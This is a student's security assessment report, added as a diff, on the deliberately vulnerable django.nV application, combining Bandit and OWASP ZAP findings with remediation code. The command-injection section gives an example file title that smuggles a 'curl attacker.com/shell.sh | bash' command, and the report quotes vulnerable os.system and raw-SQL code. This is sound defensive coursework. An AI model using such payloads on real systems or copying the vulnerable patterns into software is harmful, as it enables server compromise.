@@ -1,0 +1,164 @@
+  
+KWESIGA KATO STEVEN 
+2025/HD05/26350U 2500726350
+Mcs7201: computer systems security  
+
+Security Vulnerability Assessment Report – Part A
+django.nV - Deliberately Vulnerable Django Application
+Application	django.nV by nVisium
+Django.nV deliberately Vulnerable App	https://github.com/NetSPI/django.nV
+Fixed GitHub application	
+Static Application Security Testing (SAST) Tool	Bandit 1.7.10 - 1,712 lines analyzed
+Dynamic Application Security Testing (DAST) Tool	OWASP ZAP 2.17.0 - 47 endpoints scanned
+Total Findings	1 High · 5 Medium · 7 Low · 7 Informational
+
+1. Executive Summary
+This report presents a security vulnerability assessment of django.nV, a deliberately vulnerable Django web application. Two tools were deployed: Bandit (SAST - source code analysis) and OWASP ZAP (DAST - runtime analysis). Together they identified 20 issues. The most critical is a HIGH severity OS Command Injection that enables full server compromise via the file upload feature.
+Findings at a Glance:
+Tool	HIGH	MEDIUM	LOW	INFO
+Bandit (SAST)	1	1	3	-
+OWASP ZAP (DAST)	0	4	5	7
+COMBINED	1	5	8	7
+SAST vs DAST - Tool Complementarity
+Neither tool alone provides complete coverage. The table below illustrates their complementary strengths - issues detected exclusively by one tool that the other could not find:
+Capability	Bandit (SAST)	OWASP ZAP (DAST)
+OS Shell Injection	 Detected (HIGH)	✘ Cannot see source code
+SQL Injection Pattern	 Detected (MEDIUM)	✘ Not triggered at runtime
+Hardcoded Secrets	 Detected	✘ Not visible
+Missing HTTP Headers	✘ Not applicable	 Detected (CSP, X-CTO)
+Cookie Security Flags	✘ Not applicable	 Detected (HttpOnly, SameSite)
+CSRF Missing Tokens	✘ Not applicable	 Detected (MEDIUM)
+Vulnerable JS Libraries	✘ Not in scope	 Detected (MEDIUM, live CVE)
+ 
+2. Bandit Findings (SAST - Static Analysis)
+2.1 B605 - OS Command Injection [HIGH · CWE-78]
+Severity	HIGH - Immediate server compromise risk
+File	taskManager/misc.py  Line 33
+The application passes user-controlled input (file title) directly into os.system() to move uploaded files. An attacker can inject shell metacharacters into the title field to execute arbitrary OS commands.
+Vulnerable code:
+os.system("mv " + uploaded_file.temporary_file_path() + " " + "%s/%s" % (upload_dir_path, title))
+Attack: upload a file titled  secret; curl attacker.com/shell.sh | bash  - both commands execute.
+Fix - replace os.system() with shutil.move() which never spawns a shell:
+import shutil
+from pathlib import Path
+safe_title = Path(title).name          # strips path traversal components
+shutil.move(src, Path(upload_dir_path) / safe_title)
+
+2.2 B608 - SQL Injection via String Formatting [MEDIUM · CWE-89]
+Severity	MEDIUM - Data extraction, authentication bypass
+File	taskManager/views.py  Line 184
+Raw SQL is constructed using Python % string formatting - values are embedded directly into the query string, bypassing Django's ORM parameterization.
+Vulnerable:
+curs.execute("insert into taskManager_file ('name','path','project_id') values ('%s','%s',%s)" % (name, path, pid))
+Fix - use Django ORM (preferred) or parameterised raw query:
+# Option A: Django ORM (recommended)
+File.objects.create(name=name, path=upload_path, project_id=project_id)
+
+# Option B: Parameterised raw query
+curs.execute("INSERT INTO taskManager_file (name, path, project_id) VALUES (%s,%s,%s)", [name, path, pid])
+
+2.3 B105 - Hardcoded SECRET_KEY  [LOW · CWE-259]
+Severity	LOW - Session token forgery if key leaks via Git
+File	taskManager/settings.py  Line 24
+Django's SECRET_KEY is hardcoded in source. If the repo is public, attackers can forge session cookies and CSRF tokens.
+# VULNERABLE: SECRET_KEY = '0yxzudryd8)-%)(fz&7q-...'
+
+# FIXED: use environment variable via python-decouple
+from decouple import config
+SECRET_KEY = config('SECRET_KEY')   # reads from .env - never committed
+Also add .env to .gitignore and generate a new key: python -m django generate_secret_key
+
+2.4 B105 - Empty String Reset Tokens  [LOW · CWE-259]
+After password reset, the token is cleared with reset_token = '' (empty string). Bandit flags this as a hardcoded password sentinel. Using None is semantically correct and avoids falsy-value edge cases in token validation logic.
+# FIXED: use None for explicit null representation
+userprofile.reset_token = None
+# Update model field: reset_token = models.CharField(max_length=100, null=True, blank=True, default=None)
+ 
+3. OWASP ZAP Findings (DAST - Dynamic Analysis)
+ZAP scanned 47 live endpoints at http://127.0.0.1:8000. No HIGH severity issues were found at the HTTP level - indicating Django's built-in ORM and template engine blocked some attacks. However, 4 MEDIUM and 5 LOW issues were confirmed.
+3.1 Absence of Anti-CSRF Tokens [MEDIUM · CWE-352]
+2 form endpoints do not include CSRF tokens. An attacker can trick authenticated users into submitting state-changing requests (password changes, task creation) from a malicious third-party site.
+<!-- Fix: add {% csrf_token %} inside every <form method='post'> -->
+# settings.py - confirm this is present:
+'django.middleware.csrf.CsrfViewMiddleware'  # in MIDDLEWARE
+
+3.2 Content Security Policy Header Not Set  [MEDIUM · CWE-693]
+No CSP header on any page. Without it, any injected scripts execute freely. Systemic - affects all 47 endpoints.
+pip install django-csp
+MIDDLEWARE += ['csp.middleware.CSPMiddleware']
+CSP_DEFAULT_SRC = ("'self'",)  ;  CSP_FRAME_ANCESTORS = ("'none'",)
+
+3.3 Sub Resource Integrity (SRI) Attribute Missing  [MEDIUM · CWE-829]
+External JS/CSS files are loaded without integrity hashes. A compromised CDN can inject malicious scripts with no browser warning.
+<script src="https://cdn.../lib.js" integrity="sha384-<hash>" crossorigin="anonymous"></script>
+Generate hashes at srihash.org or: openssl dgst -sha384 -binary lib.js | openssl base64 -A
+
+3.4 Vulnerable JavaScript Library  [MEDIUM · 2 instances]
+ZAP identified 2 JS libraries with known CVEs. Outdated libraries are a common XSS and prototype pollution vector.
+npm audit          # check for vulnerabilities
+npm audit fix      # auto-patch where possible
+
+3.5 Cookie Flags: HttpOnly & SameSite Missing  [LOW]
+3 cookies lack HttpOnly (allows JS-based session theft) and SameSite (enables CSRF via cross-site requests).
+# settings.py
+SESSION_COOKIE_HTTPONLY = True  ;  SESSION_COOKIE_SAMESITE = 'Strict'
+CSRF_COOKIE_HTTPONLY    = True  ;  CSRF_COOKIE_SAMESITE    = 'Strict'
+
+3.6 Server Version Disclosure  [LOW · CWE-200]
+HTTP Server header reveals WSGIServer version and CPython version - fingerprinting info for targeted exploits. Fix: deploy with Gunicorn (removes the header) and add server_tokens off in Nginx.
+3.7 X-Content-Type-Options Header Missing  [LOW]
+Browsers may MIME-sniff responses, treating non-scripts as executable. Fix: add SECURE_CONTENT_TYPE_NOSNIFF = True in settings.py (provided by Django SecurityMiddleware).
+3.8 Cross-Domain JavaScript Inclusion  [LOW]
+Scripts loaded from external domains (Google Fonts CDN, etc.). Combine with SRI hashes (Section 3.3) or self-host via Django staticfiles + WhiteNoise.
+
+3.9  Informational / Not Triggered (ZAP Passing Rules)
+ZAP's active scanner ran full attack suites for the following and found NO vulnerabilities - confirming Django's protections are partially effective:
+Test	Result	Why it passed
+SQL Injection (active)	 PASSED - not triggered	Django ORM used in most views
+XSS (Reflected & Persistent)	 PASSED - not triggered	Django template auto-escaping active
+Path Traversal	 PASSED - not triggered	File paths validated in most routes
+Remote OS Command Injection	 PASSED at HTTP level	Bandit found it in source (B605)
+Buffer Overflow / XXE / RCE	 PASSED - not found	Python/Django not susceptible at these attack vectors
+Additional informational alerts: Suspicious Comments (26 instances - remove TODO/debug comments from production), GET for POST (1 - state-changing actions must use POST), Cookie Poisoning (1 - validate all cookie values), Session Management (3 - regenerate session ID on login, Django cycle_key() handles this by default), User Controllable HTML Element Attribute - Potential XSS (1 - never use |safe filter on user input).
+
+4. Complete Risk Matrix
+#	Vulnerability	Tool	Severity	CWE	Location
+1	OS Command Injection (Shell)	Bandit	HIGH	CWE-78	misc.py:33
+2	SQL Injection - Raw Query	Bandit	MEDIUM	CWE-89	views.py:184
+3	Absence of Anti-CSRF Tokens	ZAP	MEDIUM	CWE-352	2 form endpoints
+4	CSP Header Not Set	ZAP	MEDIUM	CWE-693	Systemic - all pages
+5	Sub Resource Integrity Missing	ZAP	MEDIUM	CWE-829	Systemic - all pages
+6	Vulnerable JS Library (2 instances)	ZAP	MEDIUM	Various CVEs	Client-side assets
+7	Hardcoded SECRET_KEY in source	Bandit	LOW	CWE-259	settings.py:24
+8	Hardcoded Empty Reset Tokens	Bandit	LOW	CWE-259	views.py:751, 767
+9	Cookie: HttpOnly Flag Missing	ZAP	LOW	CWE-1004	3 session cookies
+10	Cookie: SameSite Attribute Missing	ZAP	LOW	CWE-1275	3 session cookies
+11	Server Version Disclosure (HTTP header)	ZAP	LOW	CWE-200	All HTTP responses
+12	X-Content-Type-Options Missing	ZAP	LOW	CWE-693	Systemic
+13	Cross-Domain JS File Inclusion	ZAP	LOW	CWE-829	Systemic
+14-20	Informational Alerts (7 items)	ZAP	INFO	Various	See Section 3.9
+
+
+5. Remediation Priority & Conclusion
+5.1 Priority Remediation Order
+Pri	Severity	Action	Fix
+1	HIGH	Replace os.system() in misc.py	shutil.move() + pathlib
+2	MEDIUM	Fix raw SQL in views.py:184	Django ORM / parameterised query
+3	MEDIUM	Enable CSRF on all form endpoints	{% csrf_token %} + CsrfViewMiddleware
+4	MEDIUM	Add Content-Security-Policy header	pip install django-csp
+5	MEDIUM	Add SRI hashes to external assets	integrity= attribute on <script>/<link>
+6	LOW	Move SECRET_KEY to .env file	python-decouple; add .env to .gitignore
+7	LOW	Harden session/CSRF cookies	HttpOnly=True, SameSite='Strict', Secure=True
+8	LOW	Enable Django SecurityMiddleware headers	SECURE_CONTENT_TYPE_NOSNIFF=True etc.
+9	LOW	Deploy with Gunicorn; suppress server header	gunicorn + Nginx: server_tokens off
+
+
+
+
+5.2 Post-Fix Validation
+After applying fixes, re-run both tools and include before/after reports in the submission. Use: bandit -r taskManager/ -f html -o bandit_fixed.html - expect 0 HIGH, 0 MEDIUM. Re-run ZAP and confirm CSP, CSRF, and cookie findings are resolved. Also run pip install safety && safety check to catch dependency CVEs not covered by Bandit.
+5.3 Conclusion
+This assessment identified 20 security issues in django.nV using a SAST + DAST dual-tool methodology. The most critical - OS Command Injection (CWE-78) - allows full server compromise via the file upload mechanism and must be remediated immediately. ZAP's active scanner confirmed that Django's ORM and template engine prevented several more severe attacks (SQL injection exploitation, reflected XSS, path traversal) from being triggered at the HTTP level, demonstrating that defensive defaults matter.
+The combination of Bandit and ZAP proved highly complementary: Bandit found source-level injection flaws invisible to runtime scanning; ZAP found header and cookie weaknesses invisible to static analysis. Neither tool alone is sufficient - both must be integrated into the CI/CD pipeline throughout the SDLC.
+Security is not a feature - it is a property of the entire system. Continuous, layered security practice across the full SDLC is the only effective defense.
+
